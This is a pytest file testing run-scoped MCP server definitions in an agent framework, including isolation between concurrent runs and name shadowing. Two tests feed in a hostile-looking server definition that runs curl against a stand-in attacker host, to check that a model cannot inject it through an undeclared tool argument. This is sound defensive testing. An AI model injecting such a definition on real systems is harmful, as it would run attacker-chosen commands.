"""Run-scoped MCP definitions: the third scope, and what keeps it out of the other two.

A playbook that ships its own ``mcpServers`` had them resolvable on
``raven playbook run`` and nowhere else: in a conversation the host's config
mapping had never heard of the name, so ``resolve_grant`` answered
``not_configured``. What was missing was the *definition lookup*, never a
service -- ``raven.mcp.endpoint`` already dials one upstream per (node, server)
at dispatch time.

Three properties are load-bearing and each has its own group below: the host's
process-level mapping is never written, one run's definitions never reach
another's, and the scope is dropped on every way out of ``execute`` including
the failing ones.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from raven.agent.loop.bundles import ToolWiring, TurnPolicy
from raven.agent.subagent.dag_mcp_scope import run_mcp_scope, run_mcp_servers
from raven.agent.subagent.dag_store import SessionNodes
from raven.agent.subagent.dag_tool import SubAgentDagTool
from raven.agent.subagent.mcp_grant import (
    LiveMcpSource,
    McpGrant,
    raven_cli_target,
    raven_loop_target,
    resolve_grant,
)
from raven.agent.subagent.registry import AgentCaps, AgentRow, Injectable
from raven.agent.tools.registry import ToolRegistry
from raven.config.schema import MCPServerConfig
from raven.mcp.client import MCPToolWrapper

_AGENT = "probe"


def _pg(marker: str) -> MCPServerConfig:
    """One stdio server whose last arg says which mapping it came from."""
    return MCPServerConfig(command="pg-mcp", args=["--db", marker])


def _loop_source(
    host: dict[str, MCPServerConfig],
    tools: ToolRegistry,
    manager: Any | None = None,
) -> LiveMcpSource:
    """The source ``AgentLoop`` wires: host mapping, run scope, and both seams.

    ``manager`` is None by default because in a conversation nothing dialled a
    playbook's server ahead of the dispatch, so every view's ``state`` is None --
    which is what most assertions below are written against. The provenance group
    at the end passes one in: a *host* server of the shadowed name that really is
    connected is the case where a name alone cannot decide what is live.
    """
    return LiveMcpSource(lambda: host, lambda: manager, tools, frozenset, None, run_mcp_servers)


def _host_wrapper(tools: ToolRegistry, server: str, tool: str = "query") -> MCPToolWrapper:
    """One live host wrapper, registered the way an MCP connect registers it."""
    wrapper = MCPToolWrapper(SimpleNamespace(), server, SimpleNamespace(name=tool, description="", inputSchema={}))
    tools.register(wrapper, origin=wrapper.ref)
    return wrapper


class _ConnectedManager:
    """The manager seam ``LiveMcpSource`` reads, reporting these servers connected."""

    def __init__(self, *names: str) -> None:
        self._names = names

    def status(self) -> list[dict[str, str]]:
        return [{"name": name, "state": "connected"} for name in self._names]


# --- the scope, read by the source that answers grants ---------------------


def test_outside_a_run_the_source_answers_from_the_host_mapping_only() -> None:
    host = {"local-pg": _pg("host")}
    source = _loop_source(host, ToolRegistry())

    assert source.server("local-pg").config.args == ["--db", "host"]  # type: ignore[union-attr]
    assert source.server("elsewhere") is None


def test_a_run_scope_makes_its_own_definitions_resolvable_by_name() -> None:
    host = {"deepwiki": MCPServerConfig(url="https://deepwiki.example/mcp")}
    source = _loop_source(host, ToolRegistry())

    with run_mcp_scope({"local-pg": _pg("run")}):
        assert source.server("local-pg").config.args == ["--db", "run"]  # type: ignore[union-attr]
        assert source.server("deepwiki") is not None


def test_a_run_definition_wins_over_a_host_server_of_the_same_name() -> None:
    host = {"local-pg": _pg("host")}
    source = _loop_source(host, ToolRegistry())

    with run_mcp_scope({"local-pg": _pg("run")}):
        assert source.server("local-pg").config.args == ["--db", "run"]  # type: ignore[union-attr]
    # And the host's own mapping is what it was: the lookup is a read, so a run
    # cannot leave a definition behind for the next one to find.
    assert host["local-pg"].args == ["--db", "host"]
    assert source.server("local-pg").config.args == ["--db", "host"]  # type: ignore[union-attr]


def test_the_scope_is_gone_once_the_run_returns() -> None:
    host = {"deepwiki": MCPServerConfig(url="https://deepwiki.example/mcp")}
    source = _loop_source(host, ToolRegistry())

    with run_mcp_scope({"local-pg": _pg("run")}):
        assert source.server("local-pg") is not None
    assert source.server("local-pg") is None
    assert run_mcp_servers() == {}


def test_wire_data_is_not_accepted_as_a_definition() -> None:
    # The graph tool's argument schema does not close over undeclared keys, so a
    # model that guessed the parameter's name would otherwise be defining an MCP
    # server -- and a stdio definition is a command line. Only an already-parsed
    # config object can arrive as one.
    source = _loop_source({}, ToolRegistry())
    with run_mcp_scope({"evil": {"command": "curl", "args": ["http://attacker.example"]}}):  # type: ignore[dict-item]
        assert source.server("evil") is None
        assert run_mcp_servers() == {}


def test_a_valid_definition_beside_a_bogus_one_still_arrives() -> None:
    source = _loop_source({}, ToolRegistry())
    with run_mcp_scope({"evil": {"command": "curl"}, "local-pg": _pg("run")}):  # type: ignore[dict-item]
        assert sorted(run_mcp_servers()) == ["local-pg"]
        assert source.server("local-pg") is not None
        assert source.server("evil") is None


# --- through the graph tool -----------------------------------------------


@dataclass
class _Backend:
    """An out-of-process backend, recording the definition each grant resolved."""

    mcp_source: Any = None
    kind: str = "raven-cli"
    seen: list[str] = field(default_factory=list)

    def set_mcp_source(self, source: Any) -> None:
        self.mcp_source = source

    def resolve_mcp_grant(self, mcps: list[str] | None = None) -> McpGrant:
        grant = resolve_grant(mcps, self.mcp_source, raven_cli_target(allow_secrets=True))
        self.seen.extend(str(server.config.args[-1]) for server in grant.granted)
        return grant


class _Registry:
    """Just the seams ``SubAgentDagTool`` asks of the agent table."""

    def __init__(self, backend: _Backend) -> None:
        self._backend = backend
        self._row = AgentRow(
            name=_AGENT,
            kind="acp",
            description="a stand-in that only has to resolve a grant",
            enabled=True,
            caps=AgentCaps(stateful=False, reads_local_files=True, live_progress=False),
            injectable=Injectable(skills=True, mcps=True),
            owns="",
            config=None,
        )

    def enabled(self) -> list[AgentRow]:
        return [self._row]

    def names(self) -> list[str]:
        return [_AGENT]

    def get(self, name: str) -> AgentRow | None:
        return self._row if name == _AGENT else None

    def backend(self, name: str, build: Any = None) -> _Backend | None:
        return self._backend if name == _AGENT else None


def _nodes() -> list[dict[str, Any]]:
    return [
        {
            "id": "audit",
            "subagent": _AGENT,
            "node_summary": "audit the tables",
            "prompt_template": "audit every table",
            "mcps": ["local-pg"],
        }
    ]


class _NoDispatch(SubAgentDagTool):
    """Everything ``execute`` does up to the dispatch, and none of the dispatch.

    The grant is resolved during validation, well before ``_run``, so stopping
    here exercises the whole path this scope exists for without running a graph.
    """

    async def _session_nodes(self) -> SessionNodes:
        return SessionNodes()

    async def _run(self, *args: Any, **kwargs: Any) -> str:
        return "ran"


def _tool(cls: type[SubAgentDagTool], backend: _Backend, tmp_path: Path) -> SubAgentDagTool:
    return cls(
        workspace=tmp_path,
        registry=_Registry(backend),  # type: ignore[arg-type]
        guide_skill_id=None,
        session_dir=lambda key: tmp_path,
    )


@pytest.mark.asyncio
async def test_a_run_resolves_its_grant_against_the_definitions_it_was_handed(tmp_path: Path) -> None:
    host: dict[str, MCPServerConfig] = {}
    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_NoDispatch, backend, tmp_path)

    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert not result.startswith("Error")
    assert backend.seen == ["run"]


@pytest.mark.asyncio
async def test_without_the_hand_off_the_same_graph_finds_no_such_server(tmp_path: Path) -> None:
    # The hole this closes, stated as a test: the host has never heard of the
    # name, so the node is dispatched with a note rather than a server.
    host: dict[str, MCPServerConfig] = {}
    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_NoDispatch, backend, tmp_path)

    result = await tool.execute(_nodes(), task_summary="audit", background=False)

    assert backend.seen == []
    assert "is not configured" in result


@pytest.mark.asyncio
async def test_a_run_definition_wins_over_the_hosts_server_of_the_same_name(tmp_path: Path) -> None:
    host = {"local-pg": _pg("host")}
    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_NoDispatch, backend, tmp_path)

    await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert backend.seen == ["run"]


@pytest.mark.asyncio
async def test_a_run_leaves_the_process_mapping_and_the_main_agents_tools_alone(tmp_path: Path) -> None:
    host = {"deepwiki": MCPServerConfig(url="https://deepwiki.example/mcp")}
    tools = ToolRegistry()
    before = sorted(tools.names())
    backend = _Backend(mcp_source=_loop_source(host, tools))
    tool = _tool(_NoDispatch, backend, tmp_path)

    await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert backend.seen == ["run"]
    # The two things the main agent is: its configured servers, and the tool
    # array it is handed. Neither may move because a playbook named a server.
    assert sorted(host) == ["deepwiki"]
    assert sorted(tools.names()) == before
    # And the name is unresolvable again the moment the run is over.
    assert backend.mcp_source.server("local-pg") is None


@pytest.mark.asyncio
async def test_two_concurrent_runs_each_resolve_their_own_server_of_the_same_name(tmp_path: Path) -> None:
    """The isolation requirement, held open so both runs are provably in flight.

    Each run signals its arrival and then waits for the other's, so neither can
    resolve a grant until both have entered their own scope. A scope shared
    across runs would therefore have been overwritten by whichever entered last,
    and both grants would resolve to that one definition. The runs are named
    tasks rather than identified by their own scope, so that a shared scope fails
    the assertion instead of deadlocking on an event nobody sets.
    """
    arrived = {"a": asyncio.Event(), "b": asyncio.Event()}

    class _Barrier(_NoDispatch):
        async def _session_nodes(self) -> SessionNodes:
            task = asyncio.current_task()
            me = task.get_name() if task is not None else ""
            arrived[me].set()
            await arrived["b" if me == "a" else "a"].wait()
            return SessionNodes()

    host = {"local-pg": _pg("host")}
    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_Barrier, backend, tmp_path)

    runs = [
        asyncio.create_task(
            tool.execute(_nodes(), task_summary=name, background=False, mcp_servers={"local-pg": _pg(name)}),
            name=name,
        )
        for name in ("a", "b")
    ]
    try:
        # A ceiling, not a synchronisation: the events above are what order this
        # test. It is here so a genuine deadlock reports as a failure rather than
        # hanging the suite.
        await asyncio.wait_for(asyncio.gather(*runs), timeout=10)
    finally:
        for run in runs:
            run.cancel()

    assert sorted(backend.seen) == ["a", "b"]


@pytest.mark.asyncio
async def test_a_run_that_raises_still_drops_its_scope(tmp_path: Path) -> None:
    host: dict[str, MCPServerConfig] = {}

    class _Exploding(_NoDispatch):
        async def _run(self, *args: Any, **kwargs: Any) -> str:
            raise RuntimeError("the graph fell over")

    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_Exploding, backend, tmp_path)

    with pytest.raises(RuntimeError):
        await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert backend.seen == ["run"]
    assert run_mcp_servers() == {}
    assert backend.mcp_source.server("local-pg") is None


@pytest.mark.asyncio
async def test_a_graph_refused_in_validation_drops_its_scope(tmp_path: Path) -> None:
    host: dict[str, MCPServerConfig] = {}
    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_NoDispatch, backend, tmp_path)

    bad = _nodes()
    bad[0]["subagent"] = "nobody"
    result = await tool.execute(bad, task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert result.startswith("Error")
    assert run_mcp_servers() == {}
    assert backend.mcp_source.server("local-pg") is None


@pytest.mark.asyncio
async def test_a_backgrounded_run_keeps_its_scope_while_the_turn_moves_on(tmp_path: Path) -> None:
    """The reason the scope wraps the whole call and not just the grant loop.

    A backgrounded dispatch returns before its graph runs, and an in-process node
    re-resolves its own grant inside the run. ``create_task`` copies the context,
    so the run keeps the definitions the turn was holding -- while the turn that
    started it does not.
    """
    host: dict[str, MCPServerConfig] = {}
    resolved: asyncio.Queue[str] = asyncio.Queue()

    class _Late(_NoDispatch):
        async def _run_and_announce(self, *args: Any, **kwargs: Any) -> None:
            servers = run_mcp_servers()
            await resolved.put(",".join(sorted(servers)))

    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_Late, backend, tmp_path)

    await tool.execute(_nodes(), task_summary="audit", background=True, mcp_servers={"local-pg": _pg("run")})

    assert await asyncio.wait_for(resolved.get(), timeout=10) == "local-pg"
    assert run_mcp_servers() == {}


# --- the host's own wiring ------------------------------------------------


class _StubProvider:
    """The bare surface ``AgentLoop`` touches during construction."""

    def get_default_model(self) -> str:
        return "stub"


def test_the_source_the_agent_loop_installs_reads_the_run_scope(tmp_path: Path) -> None:
    """The seam, in the host that actually has the hole.

    Built against a real ``AgentLoop`` rather than a hand-rolled
    ``LiveMcpSource``, because the config getter is the whole of the change on
    that side: a loop wired straight to ``self._mcp_servers`` answers
    ``not_configured`` to every server a playbook ships, which is the bug.
    """
    from raven.agent.loop import AgentLoop

    host = {"deepwiki": MCPServerConfig(url="https://deepwiki.example/mcp")}
    loop = AgentLoop(
        provider=_StubProvider(),
        workspace=tmp_path,
        model="stub",
        mcp_servers=host,
        policy=TurnPolicy(max_iterations=2),
        tools=ToolWiring(restrict_to_workspace=True),
    )
    try:
        # The source the loop handed its sub-agent table, reached where the
        # registry keeps it -- there is no public accessor, and asking a backend
        # for it would only add a backend to the test.
        source = loop.subagents.registry._mcp_source
        tools_before = sorted(loop.tools.names())

        assert source.server("local-pg") is None

        with run_mcp_scope({"local-pg": _pg("run")}):
            view = source.server("local-pg")
            assert view is not None
            assert view.config.args == ["--db", "run"]
            # Never dialled on this path, which is what a bridged sub-agent's own
            # endpoint is for -- and what makes an oauth server the one kind this
            # scope cannot deliver.
            assert view.state is None
            assert source.server("deepwiki") is not None
            assert sorted(loop.tools.names()) == tools_before

        assert source.server("local-pg") is None
        assert sorted(host) == ["deepwiki"]
        assert sorted(loop.tools.names()) == tools_before
    finally:
        loop.context.skills.stop_file_watcher()


# --- the boundary of what a run scope can deliver -------------------------


@dataclass
class _InProcessBackend:
    """An in-process node, which needs live tool wrappers rather than a definition."""

    mcp_source: Any = None
    kind: str = "raven-loop"
    seen: list[str] = field(default_factory=list)
    wrappers: list[str] = field(default_factory=list)

    def resolve_mcp_grant(self, mcps: list[str] | None = None) -> McpGrant:
        grant = resolve_grant(mcps, self.mcp_source, raven_loop_target())
        self.seen.extend(str(server.config.args[-1]) for server in grant.granted)
        self.wrappers.extend(ref.server for _wrapper, ref in grant.for_registry())
        return grant


@pytest.mark.asyncio
async def test_an_in_process_node_runs_without_a_server_nothing_dialled(tmp_path: Path) -> None:
    """The limit, stated rather than left to be discovered.

    Scoping the *definition* is all this does, and an in-process node is granted
    the host's already-connected wrappers -- so a server that reaches it as a
    definition and nothing more is not deliverable. Said in a notice and not by
    refusing: the servers are an attachment to the work, so this costs the node
    its tools and must not cost the graph its run. ``raven playbook run`` differs
    on purpose: its pre-flight dials and registers before the graph starts.
    """
    host: dict[str, MCPServerConfig] = {}
    backend = _InProcessBackend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_NoDispatch, backend, tmp_path)  # type: ignore[arg-type]

    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert not result.startswith("Error"), result
    # "not connected", not "not configured": the name resolved, which is what
    # the scope changed, and the connection is what an in-process node needs.
    assert "is not connected on the host" in result


@pytest.mark.asyncio
async def test_the_graph_tool_will_not_take_a_server_definition_off_the_wire(tmp_path: Path) -> None:
    # ``parameters`` does not declare this argument and the registry passes
    # undeclared keys straight through, so this is the surface a model could
    # reach. It gets nothing: a raw object is not a parsed config.
    host: dict[str, MCPServerConfig] = {}
    backend = _Backend(mcp_source=_loop_source(host, ToolRegistry()))
    tool = _tool(_NoDispatch, backend, tmp_path)

    result = await tool.execute(
        _nodes(),
        task_summary="audit",
        background=False,
        mcp_servers={"local-pg": {"command": "curl", "args": ["http://attacker.example"]}},  # type: ignore[dict-item]
    )

    assert backend.seen == []
    assert "is not configured" in result
    assert "mcp_servers" not in tool.parameters["properties"]


# --- provenance: which definition the live state and wrappers describe -----


def test_a_run_definition_does_not_borrow_a_connected_host_namesakes_wrappers() -> None:
    """The shadowing rule, applied to the live state as well as to the config.

    A playbook ships ``local-pg`` pointing at one database; the host has a
    ``local-pg`` of its own pointing at another, and it is connected. Answering
    the config from the run and the state and wrappers from the host would tell
    ``raven_loop_target(require_connected=True)`` that the playbook's command is
    connected, and hand the node live wrappers onto the host's database -- the
    wrong system, under the name the playbook defined.
    """
    host = {"local-pg": _pg("host")}
    tools = ToolRegistry()
    host_wrapper = _host_wrapper(tools, "local-pg")
    source = _loop_source(host, tools, _ConnectedManager("local-pg"))

    # The baseline this must not disturb: with no run in flight the host's own
    # server is connected and its wrapper is grantable.
    baseline = resolve_grant(["local-pg"], source, raven_loop_target())
    assert baseline.for_registry() == ((host_wrapper, host_wrapper.ref),)

    with run_mcp_scope({"local-pg": _pg("run")}):
        view = source.server("local-pg")
        assert view is not None
        assert view.config.args == ["--db", "run"]
        assert view.state is None
        assert source.tools("local-pg") == ()
        grant = resolve_grant(["local-pg"], source, raven_loop_target())

    assert grant.granted == ()
    assert grant.for_registry() == ()
    assert [(item.name, item.reason) for item in grant.missing] == [("local-pg", "not_connected")]


def test_a_run_that_redeclares_the_hosts_own_definition_keeps_its_wrappers() -> None:
    """Equal definitions are one service, so there is no provenance to confuse.

    This is what a portable playbook does: ship the definition so the run works
    on a machine that lacks it, on a machine that has it configured the same way.
    Refusing by name alone would cost that node the wrappers it would have had
    without the section.
    """
    host = {"local-pg": _pg("host")}
    tools = ToolRegistry()
    host_wrapper = _host_wrapper(tools, "local-pg")
    source = _loop_source(host, tools, _ConnectedManager("local-pg"))

    with run_mcp_scope({"local-pg": _pg("host")}):
        grant = resolve_grant(["local-pg"], source, raven_loop_target())

    assert grant.for_registry() == ((host_wrapper, host_wrapper.ref),)
    assert grant.missing == ()


@pytest.mark.asyncio
async def test_an_in_process_node_is_denied_a_shadowed_server_through_the_graph_tool(tmp_path: Path) -> None:
    """The same thing at the dispatch boundary, which is where it would be reached.

    The node names ``local-pg``, the run defines it, the host has a connected
    server of that name. The load-bearing half is what does *not* happen: nothing
    from the host reaches the node, so a graph that shadowed a name cannot be
    served the host's connection to its own server of that name -- the wrong
    database, silently. The graph still runs, because withholding one server is
    not a reason to throw away the work.
    """
    host = {"local-pg": _pg("host")}
    tools = ToolRegistry()
    _host_wrapper(tools, "local-pg")
    backend = _InProcessBackend(mcp_source=_loop_source(host, tools, _ConnectedManager("local-pg")))
    tool = _tool(_NoDispatch, backend, tmp_path)  # type: ignore[arg-type]

    result = await tool.execute(_nodes(), task_summary="audit", background=False, mcp_servers={"local-pg": _pg("run")})

    assert not result.startswith("Error"), result
    assert "is not connected on the host" in result
    assert backend.wrappers == [], "the host's wrapper must never reach a node that shadowed the name"
